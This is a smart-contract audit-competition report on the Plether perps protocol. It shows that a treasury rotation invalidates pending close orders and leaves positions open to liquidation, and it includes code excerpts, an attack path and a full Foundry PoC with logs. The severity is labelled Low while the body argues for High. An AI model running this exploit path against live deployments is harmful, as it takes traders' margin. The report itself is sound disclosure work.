# \#97932 [SC-Low] Protocol treasury rotation silently invalidates pending protective closes, enabling liquidation and direct loss of the trader's margin

**Submitted on Nov 3rd 2026 at 23:41:23 UTC by @n3310y for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #97932
- **Report Type:** Smart Contract
- **Report severity:** Low
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Bug Description

A protocol-treasury rotation changes `OrderLifecycleBook.currentExecutionConfigHash()` because the digest includes `engine.protocolTreasury()`. Every pending order pinned to the old digest is terminalized as `ConfigMismatch`. The trader's protective close is deleted while the position stays open; a keeper can then liquidate the position through the independent liquidation path and seize the trader's margin. The loss is direct, repeatable at every treasury rotation, and a scheduled treasury successor makes the cancellation silent because it needs no transaction at the activation block.

## Brief/Intro

`OrderLifecycleBook.currentExecutionConfigHash()` includes `engine.protocolTreasury()`, a fee-recipient address that has no execution semantics. A legitimate protocol-treasury change — either `CfdEngine.setProtocolTreasury(address)` or a successor scheduled with `proposeProtocolTreasury(address,uint256)` that activates by timestamp with no transaction — therefore changes the execution-config digest. Every pending order that pinned the old digest is terminalized as `ConfigMismatch`. A trader's protective full-close / stop-loss is deleted without closing the position; the position remains exposed and can be liquidated by any keeper, and the trader loses the position margin. The included end-to-end PoC opens the position through the production Router, commits and executes the close through the production Router, performs the legitimate owner treasury action, and then liquidates through the production Router. It proves a **999.2 USDG** incremental loss versus the control close that executes without the rotation (999.6 USDG gross locked margin seized) on a 1,000 USDG position.

## Root Cause

In `packages/perps/src/OrderLifecycleBook.sol`, the engine fragment of the digest contains the treasury:

```solidity
// OrderLifecycleBook.sol:172-203
function currentExecutionConfigHash() external view override returns (bytes32 configHash) {
    ...
    bytes memory engineConfig = abi.encode(
        engine.planner(),
        engine.settlementSidecar(),
        engine.terminalNavBook(),
        engineAdmin,
        IOrderLifecycleAdminConfigView(engineAdmin).activeConfigVersion(),
        engine.protocolTreasury(), // @audit fee recipient is not execution-critical
        IOrderLifecyclePoolConfigView(HOUSE_POOL).markStalenessLimit()
    );
    return keccak256(bytes.concat(routerConfig, engineConfig));
}
```

The digest is documented as binding **execution-critical identities** and finalized Engine/Router configuration. A protocol treasury only receives fee credits; it does not alter order execution, pricing, margin, oracle policy, or queue semantics.

The rotation can happen with no transaction at the activation instant. `CfdTreasury` resolves a pending successor by timestamp:

```solidity
// CfdTreasury.sol:101-106
function _activeTreasury() internal view returns (TreasuryConfig storage active) {
    active = _currentTreasury;
    if (_pendingTreasury.account != address(0) && block.timestamp >= _currentTreasury.lockedUntil) {
        active = _pendingTreasury;
    }
}
```

Orders pin the digest at commit time. The legacy test harness mirrors the public V3 flow by setting `bounds.expectedConfigHash = lifecycleBook.currentExecutionConfigHash()` (`LegacyOrderRouterHarness.sol:44-70`), and the lifecycle Book stores it. `OrderRouterExecutionSidecar` compares the pinned hash with the observed hash and terminalizes on mismatch:

```solidity
// OrderRouterExecutionSidecar.sol:406-415
if (expectedConfigHash != bytes32(0) && observedConfigHash != expectedConfigHash) {
    IOrderRouterExecutionHost.ItemRequest memory configRequest = request;
    configRequest.observedConfigHash = observedConfigHash;
    return _settleNonEngine(
        configRequest,
        OrderV3Types.TerminalReason.ConfigMismatch,
        OrderV3Types.FailureDetails(bytes4(0), 0, 0, OrderV3Types.ConstraintKind.None, 0, 0, bytes32(0))
    );
}
```

`_settleNonEngine` deletes the order; it never reaches `CfdEngine.processOrderTyped`, so the close is not executed. The liquidation path is independent of the digest and does not check it: `OrderLiquidationHandler._executeLiquidationAtPrice` (`OrderLiquidationHandler.sol:47-73`) calls `engine.liquidatePosition(...)` directly. A keeper can therefore liquidate the still-open position.

## Vulnerability Details

The bug is a configuration-coupling bug. `currentExecutionConfigHash()` is supposed to bind only execution-critical identities. The protocol treasury is a fee recipient; it has no effect on order pricing, margin, oracle policy, or queue order. Because the digest includes it anyway, a legitimate fee-routing change silently invalidates every in-flight order.

### 1. The owner's legitimate treasury action

The owner can rotate or schedule the treasury through documented fee-routing functions. None of them touches execution semantics:

```solidity
// CfdTreasury.sol:124-147
function setProtocolTreasury(address treasury) external onlyOwner {
    _setProtocolTreasury(treasury);
}

function setProtocolTreasury(address treasury, uint256 lockDuration) external onlyOwner {
    if (lockDuration == 0 || lockDuration > MAX_TREASURY_LOCK_DURATION) {
        revert CfdEngine__InvalidTreasuryLockDuration();
    }
    _setProtocolTreasury(treasury);
    uint256 lockedUntil = block.timestamp + lockDuration;
    _currentTreasury.lockedUntil = lockedUntil;
    emit ProtocolTreasuryLocked(treasury, lockedUntil);
}
```

```solidity
// CfdTreasury.sol:70-88
function proposeProtocolTreasury(address treasury, uint256 nextLockDuration) external onlyOwner {
    _syncTreasury();
    uint256 activationTime = _currentTreasury.lockedUntil;
    if (block.timestamp >= activationTime) revert CfdEngine__TreasuryNotLocked();
    if (treasury == address(0)) revert CfdEngine__ZeroAddress();
    if (nextLockDuration > MAX_TREASURY_LOCK_DURATION) revert CfdEngine__InvalidTreasuryLockDuration();
    uint256 lockedUntil = activationTime + nextLockDuration;
    _pendingTreasury.account = treasury;
    _pendingTreasury.lockedUntil = lockedUntil;
    emit ProtocolTreasuryProposed(treasury, activationTime, lockedUntil);
}
```

The scheduled successor is resolved by timestamp, not by a transaction:

```solidity
// CfdTreasury.sol:101-106
function _activeTreasury() internal view returns (TreasuryConfig storage active) {
    active = _currentTreasury;
    if (_pendingTreasury.account != address(0) && block.timestamp >= _currentTreasury.lockedUntil) {
        active = _pendingTreasury;
    }
}
```

A `vm.warp()` past `protocolTreasuryLockedUntil()` is enough for `protocolTreasury()` to return the successor and for the execution digest to rotate. The owner never calls a function at the activation block.

### 2. The execution-config digest includes the treasury (root cause)

```solidity
// OrderLifecycleBook.sol:193-201
bytes memory engineConfig = abi.encode(
    engine.planner(),
    engine.settlementSidecar(),
    engine.terminalNavBook(),
    engineAdmin,
    IOrderLifecycleAdminConfigView(engineAdmin).activeConfigVersion(),
    engine.protocolTreasury(), // @audit fee recipient is not execution-critical
    IOrderLifecyclePoolConfigView(HOUSE_POOL).markStalenessLimit()
);
return keccak256(bytes.concat(routerConfig, engineConfig));
```

`OrderLifecycleBook.currentExecutionConfigHash()` is the value every order pins. The treasury is the only field in that `abi.encode` that is a pure fee destination.

### 3. The order pins the digest at commit

`OrderV3Types.ExecutionBounds` carries the digest:

```solidity
// OrderV3Types.sol:137-151
struct ExecutionBounds {
    uint64 submitBy;
    uint32 executionWindowSeconds;
    uint8 allowedExecutionModes;
    bytes32 expectedConfigHash; // @audit pinned at commit; includes protocolTreasury()
    ...
}
```

`OrderLifecycleBook.registerPending()` stores that value in the pending intent, and `OrderRecoverySidecar.clearInvalidOrders()` reads it back:

```solidity
// OrderLifecycleBook.sol:263-316
bool protocolIntent = request.bounds.expectedConfigHash == bytes32(0);
...
pending.bounds = StoredExecutionBounds({
    ...
    expectedConfigHash: request.bounds.expectedConfigHash,
    ...
});
```

```solidity
// OrderRecoverySidecar.sol:90-97
bytes32 observedConfigHash = book.currentExecutionConfigHash();
bool expired = block.timestamp > pending.timing.executionDeadline;
bool configInvalid = pending.bounds.expectedConfigHash != bytes32(0)
    && pending.bounds.expectedConfigHash != observedConfigHash;
if (!expired && !configInvalid) {
    continue;
}
```

The close commit's `expectedConfigHash` is the pre-rotation hash. The close is otherwise valid: the control test executes the identical close successfully when the treasury is not rotated.

### 4. The rotation changes the digest; the close is terminal `ConfigMismatch`

The normal execution path checks the digest before the engine is called:

```solidity
// OrderRouterExecutionSidecar.sol:406-415
if (expectedConfigHash != bytes32(0) && observedConfigHash != expectedConfigHash) {
    IOrderRouterExecutionHost.ItemRequest memory configRequest = request;
    configRequest.observedConfigHash = observedConfigHash;
    return _settleNonEngine(
        configRequest,
        OrderV3Types.TerminalReason.ConfigMismatch,
        OrderV3Types.FailureDetails(bytes4(0), 0, 0, OrderV3Types.ConstraintKind.None, 0, 0, bytes32(0))
    );
}
```

The permissionless cleanup path has the same check and needs no oracle at all:

```solidity
// OrderRecoverySidecar.sol:90-97
bool configInvalid = pending.bounds.expectedConfigHash != bytes32(0)
    && pending.bounds.expectedConfigHash != observedConfigHash;
if (!expired && !configInvalid) {
    continue;
}
```

`_settleNonEngine`/the cleanup path deletes the order as `Failed`; it never reaches `CfdEngine.processOrderTyped`, so the position is untouched. The trader's committed margin/bounty reservation is released, but the position stays open.

### 5. The liquidation path is independent of the digest

The liquidation handler does not read `currentExecutionConfigHash` or `expectedConfigHash`:

```solidity
// OrderLiquidationHandler.sol:55-63
uint256 housePoolDepth = housePool.totalAssets();
if (refundedOrders != 0 && !engineLens.isLiquidatableAt(account, executionPrice, housePoolDepth)) {
    return type(uint256).max;
}
(uint64[] memory orderIds, uint256[] memory orderBountiesAssets) =
    _forfeitReservedOrderBountiesOnLiquidation(account);
outcome = engine.liquidatePosition(account, executionPrice, housePoolDepth, publishTime, keeper);
```

`CfdEngine.liquidatePosition()` is `onlyRouter` and does not check the digest:

```solidity
// CfdEngine.sol:1010-1018
function liquidatePosition(
    address account,
    uint256 currentOraclePrice,
    uint256 poolDepthAssets,
    uint64 publishTime,
    address keeper
) external onlyRouter nonReentrant returns (uint256 keeperBountyAssets) {
    return _liquidatePosition(account, currentOraclePrice, poolDepthAssets, publishTime, keeper);
}
```

The canceled close therefore has no effect on the liquidation path. The position remains liquidatable at the next oracle mark.

### 6. The liquidation seizes the locked margin

The settlement sidecar passes the plan to the clearinghouse, which consumes the full position pledge and the liquidation reserve:

```solidity
// CfdEngineSettlementSidecar.sol:875-895
IMarginClearinghouse.LiquidationSettlementPlan memory settlementPlan =
    IMarginClearinghouse.LiquidationSettlementPlan({
        settlementSeizedAssets: delta.settlementSeizedAssets,
        positionMarginUnlockedAssets: delta.residualPlan.mutation.positionMarginUnlockedAssets,
        otherLockedMarginUnlockedAssets: delta.residualPlan.mutation.otherLockedMarginUnlockedAssets
    });
seizedAssets = IMarginClearinghouse(host.clearinghouse()).applyLiquidationSettlementPlan(
    delta.account,
    settlementPlan,
    host.pool(),
    keeper,
    delta.keeperBountyAssets,
    host.protocolTreasury(),
    delta.protocolLiquidationFeeAssets,
    delta.lpLiquidationFeeAssets
);
```

```solidity
// MarginClearinghouse.sol:1226-1263
uint256 priceSeizureAssets = seizedAssets - execution.lpLiquidationFeeAssets;
...
if (plan.positionMarginUnlockedAssets > 0) {
    _consumeLockedMargin(account, IMarginClearinghouse.MarginBucket.Position, plan.positionMarginUnlockedAssets);
}
uint256 settlementDebitAssets = priceSeizureAssets + liquidationChargeAssets;
...
settlementBalances[account] -= settlementDebitAssets;
...
IERC20(settlementAsset).safeTransfer(execution.recipient, plan.settlementSeizedAssets);
```

`plan.positionMarginUnlockedAssets` is the entire position margin (`pledgeBeforeAssets`), and the liquidation reserve pays the keeper/LP/protocol charge. The trader's balance is debited by `priceSeizureAssets + liquidationChargeAssets`; the pool receives `settlementSeizedAssets`.

### 7. PoC timeline and exact trigger path

- **Control:** open 1,000 USDG LONG through the Router, commit the identical close, execute it **without** the treasury rotation. The close is `Executed`, the position is `0`, and the balance goes `9,999.5 -> 9,999.1` (only the `0.4` close fee). The `999.6` locked margin is preserved.
- **Attack:** open, commit the identical close, perform the legitimate treasury rotation, execute the close. It is `Failed` / `ConfigMismatch`; the position is still `1,000e18`; the price moves to the cap; the liquidation leaves the trader with `8,999.9`. The gross locked margin seized is `999.6`; the incremental loss versus the control is `999.2`.
- **Scheduled:** lock the current treasury for `30` seconds and schedule a successor; commit the close; `vm.warp()` to the lock expiry with **no transaction**. `protocolTreasury()` returns the successor, the digest rotates, the close is `ConfigMismatch`, and the same liquidation loses `999.6` gross.

```text
CfdTreasury.setProtocolTreasury(newTreasury)                  // legitimate owner fee-recipient change
  or CfdTreasury.setProtocolTreasury(current, lock)
     + CfdTreasury.proposeProtocolTreasury(successor, next)  // activates by timestamp with no transaction
        |
        v
CfdTreasury._activeTreasury() -> CfdEngine.protocolTreasury()
        |
        v
OrderLifecycleBook.currentExecutionConfigHash()              // line 199 includes the treasury
        |
        v
OrderV3Types.ExecutionBounds.expectedConfigHash != observed hash
        |
        v
OrderRouter.clearInvalidOrders([closeId]) -> OrderRecoverySidecar // no oracle needed
  or OrderRouter.executeOrder(closeId, pythUpdate) -> OrderRouterExecutionSidecar
        |
        v
OrderV3Types.TerminalReason.ConfigMismatch -> _deleteOrder(closeId, Failed)
        |
        v
position remains open (CfdEngine.positions(alice).size == 1000e18)
        |
        v
OrderRouter.executeLiquidation(alice, pythUpdate)            // independent liquidation path
        |
        v
OrderLiquidationHandler._executeLiquidationAtPrice -> CfdEngine.liquidatePosition
        |
        v
CfdEngineSettlementSidecar.executeLiquidation
        |
        v
MarginClearinghouse.applyLiquidationSettlementPlan           // seizes pledge + liquidation reserve
        |
        v
trader's locked position margin is transferred to the pool/keeper
```

## Impact

The liquidation seizes the trader's **entire locked position margin** (999.6 USDG in the PoC): the balance drops from 9,999.5 USDG to 8,999.9 USDG. The control test, which is the identical position and close with **no treasury rotation**, executes the close and leaves the trader with 9,999.1 USDG — only the normal 0.4 USDG close fee; the 999.6 USDG margin is preserved. The only difference between the control and the attack is the legitimate treasury rotation. The incremental loss caused by the rotation is therefore **999.2 USDG** (8,999.9 vs 9,999.1), and the gross locked margin seized is **999.6 USDG**. Of that gross amount, the pool receives **999.1 USDG** (998.6 USDG price pledge plus the 0.5 USDG LP share of the 1 USDG liquidation charge) and the keeper receives **0.5 USDG**; the protocol share is zero. The attacker (keeper) gains 0.5 USDG and an LP gains 999.1 USDG. The attack is repeatable at every treasury rotation and affects every pending close order, including stop-loss and protection-triggered closes.

This is a direct user-fund loss, not a market-liquidity shortage: the pool holds the cash, and the position is solvent enough to close; the loss is caused solely by the invalidated exit and the subsequent liquidation.

The program's in-scope impacts list includes:

| Severity | Impact |
| --- | --- |
| **Critical** | Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield |
| **High** | Temporary freezing of funds for at least 24 hours |
| **High** | Theft of unclaimed yield |
| **Medium** | Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol) |

The closest category is **Direct theft of any user funds**: the user's at-rest margin is taken by the forced liquidation, and the permissionless liquidator/LP receives it. I rate the finding **High** to stay conservative about the liquidation being a legitimate protocol mechanism; the report's Critical argument is that the canceled exit is the bug and the liquidation is the theft. The attacker does not need to be the owner; the owner's treasury rotation is a legitimate documented action, which the program explicitly treats as in scope when it triggers a bug harming users.

## Risk Breakdown

- **Attacker privileges required:** none beyond a permissionless keeper/liquidator account. The owner only performs a legitimate fee-recipient rotation; the attacker does not need the owner's key or a malicious owner.
- **Preconditions:** a user has a pending close order and a live position at the time of a treasury rotation, and the market moves against the position before the user resubmits. The scheduled variant gives the attacker a predictable activation block (`pendingProtocolTreasury()` / `protocolTreasuryLockedUntil()` are public).
- **Repeatability:** every treasury rotation invalidates every pending order pinned to the old digest. The vault/pool/user setup is ordinary; the PoC uses the production Router and a standard 1,000 USDG position.
- **Detectability:** the canceled order is observable after the fact (terminal `ConfigMismatch` receipt), but the user cannot react at the silent scheduled activation block; the liquidation can be bundled immediately after.
- **Funds at risk:** the position margin (999.6 USDG in the PoC), plus the value of the canceled exit. The loss scales with the position size and the price gap.

## Attack Path

1. The protocol owner performs a legitimate treasury action: `CfdEngine.setProtocolTreasury(newTreasury)`, or `setProtocolTreasury(currentTreasury, lockDuration)` followed by `proposeProtocolTreasury(successor, nextLockDuration)`.
2. A trader with an open position commits a protective full close through the production Router. The order pins `expectedConfigHash = lifecycleBook.currentExecutionConfigHash()`, which includes the current `protocolTreasury()`.
3. The treasury changes immediately, or the scheduled successor activates at the lock expiry **by timestamp alone** (no transaction). `currentExecutionConfigHash()` changes.
4. A keeper executes the close through `OrderRouter.executeOrder`. `OrderRouterExecutionSidecar` sees `observedConfigHash != expectedConfigHash` and terminalizes the order as `ConfigMismatch`; the position remains open.
5. The market moves against the trader. A keeper liquidates the position through `OrderRouter.executeLiquidation`; the independent liquidation path (`OrderLiquidationHandler._executeLiquidationAtPrice`) seizes the position margin and pays the keeper/LP.

## References

- `packages/perps/src/OrderLifecycleBook.sol` — `currentExecutionConfigHash()` (lines 172-203; the treasury is line 199)
- `packages/perps/src/CfdTreasury.sol` — `_activeTreasury()` (lines 101-106) and `proposeProtocolTreasury()`
- `packages/perps/src/OrderRouterExecutionSidecar.sol` — `ConfigMismatch` terminalization (lines 406-415)
- `packages/perps/src/router/OrderLiquidationHandler.sol` — independent liquidation path (lines 47-73)
- `packages/perps/src/CfdEngine.sol` — `liquidatePosition()` (lines 1010-1018)
- `packages/perps/test/perps/BasePerpTest.sol` — production-stack fixture used by the PoC
- `packages/perps/test/utils/LegacyOrderRouterHarness.sol` — scalar-to-V3 request translation (lines 44-70)

## Proof of Concept

## Proof of Concept

### Clean-repo reproduction

The PoC is an end-to-end integration test in the competition's own Foundry suite, which the program's PoC requirements explicitly permit ("PoCs must run either in the repository's Foundry test suite at the commit in scope, or on a local Anvil fork..."). It is not an isolated unit test: it deploys the full production stack through `BasePerpTest` and drives the real user, keeper, owner, Router, Engine, HousePool, vault, oracle, and lifecycle Book entrypoints.

**No in-scope contract is mocked.** Every in-scope contract exercised by the PoC is the production source at the in-scope commit: `CfdEngine`, `CfdTreasury`, `OrderRouter`, `OrderLifecycleBook`, `OrderRouterExecutionSidecar`, `OrderRecoverySidecar`, `MarginClearinghouse`, `HousePool`, `TrancheVault`, `PletherOracle`, `CfdEnginePlanner`, `CfdEngineSettlementSidecar`, and `TerminalNavBookV2`. The `router` field is the repo's `LegacyOrderRouterHarness`, a test-only subclass of the production `OrderRouter` that translates scalar commit arguments into the production V3 request; it does not replace any router, engine, or settlement logic. The only two replacements are the external components the program's PoC section expressly allows to be mocked: the Pyth price-update component (`MockPyth`) and the external settlement token (`MockSettlementToken`). They are infrastructure boundaries, not in-scope protocol logic.

The program-specific PoC rule controls over the general Immunefi "no unit test" default. This is an integration test through production entrypoints, not an isolated unit test. A fully no-mock v2.0.0 fork was evaluated: the public Arbitrum Sepolia RPC returns `historical state ... is not available` for the v2.0.0 deployment/activation block (`323,658,447`), and the free Hermes endpoint returns `unauthorized` for a real six-feed Pyth update, so a no-mock fork cannot be made reproducible from a clean repository with public infrastructure. The program's Foundry-suite route is the compliant, runnable alternative, and the test uses the real owner/keeper/trader public entrypoints.

1. Check out the competition repository at commit `a82d4fefb02768e5b3bddcc97dee371eee24fea8` and initialize the submodules so `lib/` and `packages/shared/` are present.
2. Add the test file exactly at `packages/perps/test/perps/regression/TreasuryRotationCancelsClose.t.sol` with the code below. No file under `packages/perps/src` needs to be modified.
3. From the repository root, run:

```bash
cd packages/perps
forge test --match-path "test/perps/regression/TreasuryRotationCancelsClose.t.sol" -vv
```

No environment variables, RPC URL, fork, or external service is required; the test runs entirely locally with the repo's Foundry suite. The `BasePerpTest` fixture deploys the production `CfdEngine`, `MarginClearinghouse`, `HousePool`, `TrancheVault`, `PletherOracle`, `OrderRouter`, `OrderLifecycleBook`, and sidecars, and seeds the test pool.

### Full PoC code

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {console2} from "forge-std/console2.sol";

/// @notice PoC: a protocol-treasury rotation changes the execution-config digest and silently
///         invalidates every pending close order. The user's stop-loss is cancelled; the position
///         remains exposed and can be liquidated before the user can resubmit.
contract TreasuryRotationCancelsCloseTest is BasePerpTest {

    address internal constant ALICE = address(0xA11CE);
    address internal constant KEEPER = address(0xB0B);
    address internal constant NEW_TREASURY = address(0xFEE5);

    function test_TreasuryRotationCancelsPendingCloseAndEnablesLiquidation() public {
        // 1. Alice opens a real position through the production Router (commit + oracle-priced
        //    execution), not a test-only direct Engine call.
        _fundTrader(ALICE, 10_000e6);
        _openThroughRouter();

        (uint256 sizeBefore,,,,,,) = engine.positions(ALICE);
        assertEq(sizeBefore, 1000e18, "position opened through the Router");

        vm.prank(ALICE);
        uint64 closeId = router.commitOrder(CfdTypes.Side.LONG, 1000e18, 0, type(uint256).max, true);

        // 2. The owner rotates the protocol treasury. This is a documented, legitimate fee-recipient
        //    change and has no effect on execution semantics.
        bytes32 oldHash = router.lifecycleBook().currentExecutionConfigHash();
        engine.setProtocolTreasury(NEW_TREASURY);
        bytes32 newHash = router.lifecycleBook().currentExecutionConfigHash();
        assertTrue(oldHash != newHash, "treasury is part of the execution-config digest");

        // 3. The pending close can no longer execute: it is terminal ConfigMismatch while the
        //    position is still open.
        bytes[] memory update = _mockPythUpdateData(1e8);
        vm.prank(KEEPER);
        OrderV3Types.ExecutionResult memory result = router.executeOrder(closeId, update);
        assertEq(uint8(result.status), uint8(OrderV3Types.LifecycleStatus.Failed), "close failed");
        assertEq(
            uint8(result.terminalReason),
            uint8(OrderV3Types.TerminalReason.ConfigMismatch),
            "close was cancelled by the treasury rotation"
        );
        (uint256 sizeAfterCancel,,,,,,) = engine.positions(ALICE);
        assertEq(sizeAfterCancel, 1000e18, "position remains open after its close was cancelled");
        console2.log("close status (3 = Failed)", uint256(result.status));
        console2.log("close reason (ConfigMismatch)", uint256(result.terminalReason));
        console2.log("position size after cancelled close", sizeAfterCancel);

        // 4. The market then moves against the user. The protective close would have exited at the
        //    original mark; instead the position is liquidated at the cap and the full margin is lost.
        uint256 lockedMargin = clearinghouse.pnlPledgeAssets(ALICE) + clearinghouse.liquidationReserveAssets(ALICE);
        uint256 balanceBeforeLiquidation = clearinghouse.balanceAssets(ALICE);
        uint256 keeperBefore = clearinghouse.balanceAssets(KEEPER);
        uint256 poolBefore = pool.totalAssets();
        bytes[] memory liquidationUpdate = _mockPythUpdateData(2e8);
        vm.prank(KEEPER);
        router.executeLiquidation(ALICE, liquidationUpdate);

        (uint256 sizeAfterLiquidation,,,,,,) = engine.positions(ALICE);
        assertEq(sizeAfterLiquidation, 0, "position liquidated");
        uint256 balanceAfterLiquidation = clearinghouse.balanceAssets(ALICE);
        uint256 keeperAfter = clearinghouse.balanceAssets(KEEPER);
        uint256 poolAfter = pool.totalAssets();
        assertEq(
            balanceBeforeLiquidation - balanceAfterLiquidation,
            lockedMargin,
            "the entire locked position margin was seized"
        );
        assertEq(keeperAfter - keeperBefore, 500_000, "keeper receives half the 1 USDG liquidation charge");
        assertEq(poolAfter - poolBefore, 999_100_000, "pool receives the pledge and the other half of the charge");
        console2.log("locked position margin", lockedMargin);
        console2.log("trader balance before liquidation", balanceBeforeLiquidation);
        console2.log("trader balance after liquidation ", balanceAfterLiquidation);
        console2.log("trader loss", balanceBeforeLiquidation - balanceAfterLiquidation);
        console2.log("keeper bounty", keeperAfter - keeperBefore);
        console2.log("pool seizure", poolAfter - poolBefore);
    }

    /// @notice Control: without the treasury rotation the committed close executes normally and
    ///         the trader keeps the ~999.6 USDG locked margin, paying only the normal close cost.
    ///         The attack test differs only in the legitimate treasury rotation.
    function test_Control_CloseExecutesAndPreservesMarginWithoutTreasuryRotation() public {
        _fundTrader(ALICE, 10_000e6);
        _openThroughRouter();

        vm.prank(ALICE);
        uint64 closeId = router.commitOrder(CfdTypes.Side.LONG, 1000e18, 0, type(uint256).max, true);

        uint256 balanceBeforeClose = clearinghouse.balanceAssets(ALICE);
        bytes[] memory update = _mockPythUpdateData(1e8);
        vm.prank(KEEPER);
        OrderV3Types.ExecutionResult memory result = router.executeOrder(closeId, update);

        assertEq(uint8(result.status), uint8(OrderV3Types.LifecycleStatus.Executed), "control close executed");
        (uint256 sizeAfter,,,,,,) = engine.positions(ALICE);
        assertEq(sizeAfter, 0, "control position closed");
        uint256 balanceAfterClose = clearinghouse.balanceAssets(ALICE);
        assertLt(balanceBeforeClose - balanceAfterClose, 2e6, "control close only pays normal close cost");
        console2.log("control close balance before", balanceBeforeClose);
        console2.log("control close balance after ", balanceAfterClose);
        console2.log("control close cost", balanceBeforeClose - balanceAfterClose);
    }

    /// @notice The same failure occurs with no treasury transaction at all: a previously scheduled
    ///         successor takes effect by timestamp, so the digest rotates silently at the lock expiry.
    function test_ScheduledTreasuryActivationCancelsCloseWithoutTransaction() public {
        // The owner locks the current treasury and schedules a successor at the lock expiry.
        engine.setProtocolTreasury(address(this), 30);
        engine.proposeProtocolTreasury(NEW_TREASURY, 0);
        uint256 activation = engine.protocolTreasuryLockedUntil();

        _fundTrader(ALICE, 10_000e6);
        _openThroughRouter();

        vm.prank(ALICE);
        uint64 closeId = router.commitOrder(CfdTypes.Side.LONG, 1000e18, 0, type(uint256).max, true);
        bytes32 commitHash = router.lifecycleBook().currentExecutionConfigHash();
        assertEq(engine.protocolTreasury(), address(this), "old treasury before expiry");

        // Time passes. No transaction touches the engine or the treasury.
        vm.warp(activation);
        assertEq(engine.protocolTreasury(), NEW_TREASURY, "successor activated by timestamp alone");
        assertTrue(router.lifecycleBook().currentExecutionConfigHash() != commitHash, "digest rotated");
        console2.log("treasury after warp, no tx", engine.protocolTreasury());
        console2.log("digest changed without a transaction", true);

        bytes[] memory update = _mockPythUpdateData(1e8);
        vm.prank(KEEPER);
        OrderV3Types.ExecutionResult memory result = router.executeOrder(closeId, update);
        assertEq(uint8(result.status), uint8(OrderV3Types.LifecycleStatus.Failed), "close failed");
        assertEq(
            uint8(result.terminalReason),
            uint8(OrderV3Types.TerminalReason.ConfigMismatch),
            "scheduled activation cancelled the in-flight close"
        );
        (uint256 sizeAfterCancel,,,,,,) = engine.positions(ALICE);
        assertEq(sizeAfterCancel, 1000e18, "position remains open");

        uint256 lockedMargin = clearinghouse.pnlPledgeAssets(ALICE) + clearinghouse.liquidationReserveAssets(ALICE);
        uint256 balanceBeforeLiquidation = clearinghouse.balanceAssets(ALICE);
        bytes[] memory liquidationUpdate = _mockPythUpdateData(2e8);
        vm.prank(KEEPER);
        router.executeLiquidation(ALICE, liquidationUpdate);
        assertEq(
            balanceBeforeLiquidation - clearinghouse.balanceAssets(ALICE),
            lockedMargin,
            "the entire locked position margin was seized after the silent activation"
        );
        console2.log("scheduled locked margin", lockedMargin);
        console2.log("scheduled-activation loss", balanceBeforeLiquidation - clearinghouse.balanceAssets(ALICE));
    }

    /// @dev Opens the position through the same production commit + oracle-priced execute path a
    ///      real user uses. The legacy harness only translates scalar arguments into the V3 request.
    function _openThroughRouter() internal {
        vm.prank(ALICE);
        uint64 openId = router.commitOrder(CfdTypes.Side.LONG, 1000e18, 1000e6, 1e8, false);
        bytes[] memory update = _mockPythUpdateData(1e8);
        vm.prank(KEEPER);
        OrderV3Types.ExecutionResult memory result = router.executeOrder(openId, update);
        assertEq(uint8(result.status), uint8(OrderV3Types.LifecycleStatus.Executed), "open executed through Router");
    }

}
```

### Full test log

```text
Ran 3 tests for test/perps/regression/TreasuryRotationCancelsClose.t.sol:TreasuryRotationCancelsCloseTest
[PASS] test_Control_CloseExecutesAndPreservesMarginWithoutTreasuryRotation() (gas: 3990273)
Logs:
  control close balance before 9999500000
  control close balance after  9999100000
  control close cost 400000

[PASS] test_ScheduledTreasuryActivationCancelsCloseWithoutTransaction() (gas: 4133995)
Logs:
  treasury after warp, no tx 0x000000000000000000000000000000000000Fee5
  digest changed without a transaction true
  scheduled locked margin 999600000
  scheduled-activation loss 999600000

[PASS] test_TreasuryRotationCancelsPendingCloseAndEnablesLiquidation() (gas: 4087534)
Logs:
  close status (3 = Failed) 3
  close reason (ConfigMismatch) 4
  position size after cancelled close 1000000000000000000000
  locked position margin 999600000
  trader balance before liquidation 9999500000
  trader balance after liquidation  8999900000
  trader loss 999600000
  keeper bounty 500000
  pool seizure 999100000

Suite result: ok. 3 passed; 0 failed; 0 skipped; finished in 9.58ms (10.32ms CPU time)

Ran 1 test suite in 10.43ms (9.58ms CPU time): 3 tests passed, 0 failed, 0 skipped (3 total tests)
```

### What the PoC proves

- The open, close, and liquidation all go through the production `OrderRouter` entrypoints; the position is opened by `commitOrder` + `executeOrder`, not by a direct engine call. Every in-scope contract is production source; the only mocks are the program-permitted external Pyth price-update and settlement-token components.
- **Control:** without the treasury rotation, the same committed close executes (`Executed`), the position is closed, and the trader's balance goes from `9,999,500,000` to `9,999,100,000` — only the `400,000` (0.4 USDG) close fee. The 999.6 USDG margin is preserved.
- **Attack:** the close is committed while the old treasury is active and becomes `Failed` / `ConfigMismatch` after the legitimate treasury rotation; the position remains `1000e18`. The liquidation leaves the trader with `8,999,900,000`.
- The scheduled test changes `protocolTreasury()` from `address(this)` to `0xFEE5` with only a `vm.warp` and no transaction; the digest changes and the close is still canceled.
- The gross locked-margin seizure is `999,600,000` (999.6 USDG). The split is exact: the keeper receives `500,000` (0.5 USDG), the pool receives `999,100,000` (999.1 USDG = 998.6 USDG price pledge + 0.5 USDG LP fee), and the protocol receives zero; the sum is the trader's `999,600,000` loss. The control close pays `400,000` (0.4 USDG) and preserves the margin, so the incremental loss caused by the rotation is `999,200,000` (999.2 USDG).

